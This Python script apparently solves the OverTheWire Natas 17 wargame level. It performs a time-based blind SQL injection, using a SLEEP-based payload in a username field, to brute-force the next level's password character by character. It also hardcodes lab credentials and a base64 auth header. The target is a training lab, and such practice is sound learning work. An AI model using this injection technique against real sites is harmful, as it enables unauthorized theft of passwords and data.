import os
import urllib.request as url
import urllib.parse
import string
import time

NATAS_URL = 'http://natas17.natas.labs.overthewire.org'
NATAS_USERNAME = 'natas17'
NATAS_PWD = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
PASSWORD_LENGTH = 33


def isCorrectInput(string):
    '''
    Determines if the string returns "This user exists" or not

        Parameters:
            string : The input to the form
            
        Returns:
            True if the output is "This user exists". False otherwise
    '''
    request = urllib.parse.urlencode({'username': f'natas18" and password like BINARY "{string}" and SLEEP(3)=0 OR "'})
    request = request.encode('ascii')

    post_request = url.Request(NATAS_URL, request)

    start_time = time.time()
    output = url.urlopen(post_request)
    process_time = time.time() - start_time
    print(process_time)

    html_page = output.read().decode()

    return process_time > 3


def next_char(previous_chars = '', password_letters = string.ascii_letters + string.digits):
    '''
    Determines the value of the next character. 

        Parameters:
            previous_char : The known first characters of the strings
            password_letters : The list of valid characters to loop into
        
        Returns:
            The known first characters with the new one appended
    '''
    for char in password_letters:
        test_string = previous_chars + char
        if isCorrectInput(test_string + '%'):
            return test_string


if __name__ == "__main__":

    ## =======================================================================================
    ## FETCH PAGE
    ## ----------
    ## This part works. I am able to reach the form page.
    ## =======================================================================================

    auth_handler = url.HTTPBasicAuthHandler()
    auth_handler.add_password('Authentication required', NATAS_URL, NATAS_USERNAME, NATAS_PWD)

    opener = url.build_opener(auth_handler)
    url.install_opener(opener)

    ## This commented out tactic also works. The website accepts the Authorization header
    ## after having connected at least once 

    # request = url.Request(NATAS_URL)
    # request.add_header('Authorization', 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==')
    # output = url.urlopen(request)

    output = url.urlopen(NATAS_URL)

    # This part is not necessary. It was only to prove myself that the urllib package works
    with open('output.html', 'w') as file:
        file.write(output.read().decode())

    ## =======================================================================================
    ## This part creates a list of letters that are in the password. I commented it out 
    ## because it takes some time to run so I want to avoid running it too often
    ## =======================================================================================

    alphanum = string.ascii_letters + string.digits

    password_letters = list()

    for alnum in alphanum:
        if isCorrectInput('%' + alnum + '%'):
            password_letters.append(alnum)

    print(password_letters)

    ## =======================================================================================
    ## BRUTEFORCE
    ## ----------
    ## This is where the fun begins. I am going to bruteforce the password using the password_letters
    ## list that I have generated
    ## =======================================================================================

    # password_letters = ['d', 'g', 'h', 'j', 'l', 'm', 'p', 'q', 's', 'v', 'w', 'x', 'y', 'C', 'D', 'F', 'I', 'K', 'O', 'P', 'R', '0', '4', '7']
    password = ''
    for i in range(PASSWORD_LENGTH - 1):
        password = next_char(password, password_letters)
        print(password)
    print('Bruteforce end')
